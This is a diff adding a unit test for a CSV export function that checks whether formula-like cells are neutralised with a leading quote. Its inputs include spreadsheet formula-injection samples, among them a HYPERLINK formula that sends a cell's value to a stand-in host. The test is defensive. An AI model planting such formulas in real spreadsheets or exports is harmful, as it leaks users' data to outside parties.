@@ -54,6 +54,18 @@ describe('exportToCsv', () => {
     ])
   })
 
+  // Review of 23 Sep 2026: a title written on the portal must not run as a formula in Excel.
+  it('a cell that starts like a formula gets a leading quote; a plain signed number keeps its sign', async () => {
+    exportToCsv('x', [{ key: 'v', label: 'Value' }], [
+      { v: '=HYPERLINK("https://x.example/?"&A2,"Open")' }, { v: '+cmd' }, { v: '-2+3' }, { v: '@SUM(A1)' }, { v: '\tx' },
+      { v: '-5' }, { v: '+3.5' }, { v: -7 }, { v: 'fine' },
+    ])
+    expect((await content(downloads[0]!)).split('\r\n').slice(1)).toEqual([
+      `"'=HYPERLINK(""https://x.example/?""&A2,""Open"")"`, "'+cmd", "'-2+3", "'@SUM(A1)", "'\tx",
+      '-5', '+3.5', '-7', 'fine',
+    ])
+  })
+
   it('a label is escaped like a value', async () => {
     exportToCsv('x', [{ key: 'v', label: 'Impact, urgency' }], [])
     expect(await content(downloads[0]!)).toBe('\uFEFF"Impact, urgency"')
